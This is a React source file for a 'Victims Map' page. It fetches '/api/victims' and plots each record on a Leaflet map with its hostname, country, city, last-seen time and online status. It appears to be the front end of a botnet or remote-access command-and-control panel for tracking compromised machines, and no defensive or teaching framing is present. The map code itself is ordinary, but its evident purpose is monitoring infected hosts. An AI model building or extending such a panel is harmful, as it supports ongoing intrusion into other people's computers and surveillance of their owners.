import React, { useState, useEffect } from 'react';
import { MapContainer, TileLayer, Marker, Popup } from 'react-leaflet';
import L from 'leaflet';
import axios from 'axios';
import 'leaflet/dist/leaflet.css';

// Исправление для иконок в Leaflet
delete L.Icon.Default.prototype._getIconUrl;
L.Icon.Default.mergeOptions({
  iconRetinaUrl: 'https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.7.1/images/marker-icon-2x.png',
  iconUrl: 'https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.7.1/images/marker-icon.png',
  shadowUrl: 'https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.7.1/images/marker-shadow.png',
});

function MapView() {
  const [victims, setVictims] = useState([]);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    fetchVictims();
  }, []);

  const fetchVictims = async () => {
    try {
      const response = await axios.get('/api/victims');
      // Фильтруем только тех, у кого есть координаты
      const withLocation = response.data.filter(v => v.latitude && v.longitude);
      setVictims(withLocation);
      setLoading(false);
    } catch (error) {
      console.error('Error fetching victims:', error);
    }
  };

  if (loading) return <div className="loading">Loading map...</div>;

  // Центр карты (примерно середина мира)
  const center = [20, 0];

  return (
    <div>
      <h1>🗺️ Victims Map</h1>
      <div style={{ height: '600px', marginTop: '1rem' }}>
        <MapContainer
          center={center}
          zoom={2}
          style={{ height: '100%', width: '100%' }}
        >
          <TileLayer
            url="https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png"
            attribution='&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors'
          />
          {victims.map(victim => (
            <Marker
              key={victim.victim_id}
              position={[victim.latitude, victim.longitude]}
            >
              <Popup>
                <strong>Victim: {victim.victim_id.substring(0, 16)}...</strong><br />
                Hostname: {victim.hostname}<br />
                Country: {victim.country}<br />
                City: {victim.city}<br />
                Last seen: {new Date(victim.last_seen).toLocaleString()}<br />
                Status: {victim.is_online ? '🟢 Online' : '🔴 Offline'}
              </Popup>
            </Marker>
          ))}
        </MapContainer>
      </div>
    </div>
  );
}

export default MapView;